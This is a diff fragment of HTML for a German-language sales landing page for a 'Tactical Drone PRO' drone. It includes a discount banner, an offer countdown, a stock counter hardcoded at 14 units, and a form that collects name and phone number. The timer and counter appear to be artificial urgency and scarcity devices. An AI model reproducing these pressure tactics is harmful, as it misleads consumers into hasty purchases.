+			</div>
+			<div class="forma">
+				<div class="top">
+					<div class="title"><span class="titlespan">Tactical Drone</span> <span class="titlespan2">PRO</span></div>
+					<div class="description">
+						<div class="left">Eine echte Entdeckung auf dem modernen Drohnenmarkt</div>
+					</div>
+					<div class="features">
+						<div class="left">
+							<div class="l1">
+								<img src="img/check.png">
+								<p>Perfekte Stabilisierung auch bei starkem Wind</p>
+							</div>
+							<div class="l2">
+								<img src="img/check.png">
+								<p>Konstruktion sturz - und stoßfest</p>
+							</div>
+							<div class="l3">
+								<img src="img/check.png">
+								<p>Makellose Geschwindigkeit und Kontrolle</p>
+							</div>
+						</div>
+						<div class="right">
+							<img src="img/sale.png" alt="">
+							<div class="text">
+								<div class="t2">50%</div>
+								<div class="t3">Rabatt</div>
+							</div>
+						</div>
+					</div>
+					<img src="img/drone.png" alt="">
+				</div>
+				<div class="timer" id="form">
+					<p>Bis zum Ende des Angebots bleibt:</p>
+					<div class="clockdiv" id="clockdiv2">
+						<div>
+							<span class="hours"></span>
+						</div>
+						<div class="mins">
+							<span class="minutes"></span>
+						</div>
+						<div>
+							<span class="seconds"></span>
+						</div>
+					</div>
+				</div>
+				<div class="price">
+					<div class="old">
+						<p>Gemeinsamer Preis</p>
+						<span class="al-cost-promo">€</span>
+					</div>
+					<div class="new">
+						<p>Preis heute</p>
+						<span class="al-cost">€</span>
+					</div>
+				</div>
+				<form class="al-form" method="post" action="/land/order">
+					<select name="country" class="al-country" style="display:none"></select>
+					<div>Vollständiger Name</div>
+					<div class="input-wrapper">
+						<input type="text" name="name" placeholder="Name" id="name">
+						<label for="name"></label>
+					</div>
+					<div>Kontakt-Telefon</div>
+					<div class="input-wrapper">
+						<input type="tel" name="phone" placeholder="Telefonnummer" id="phone">
+						<label for="phone"></label>
+					</div>
+					<button type="submit" class="btn">BESTELLUNG MIT RABATT</button>
+				</form>
+				<div class="leftprod">
+					<span><b class="js-countdown">14</b> Drohnen</span> blieben verfügbar
+					<img src="img/arrow.png" alt="">
+				</div>
+			</div>
+		</div>
+		<script src="js/main.js"></script>
+		<script src="js/countdown.js"></script>
+		<script src="/tl-validator.js?country=de&label=true"></script>
+	</body>
 </html>
-<?php exit;
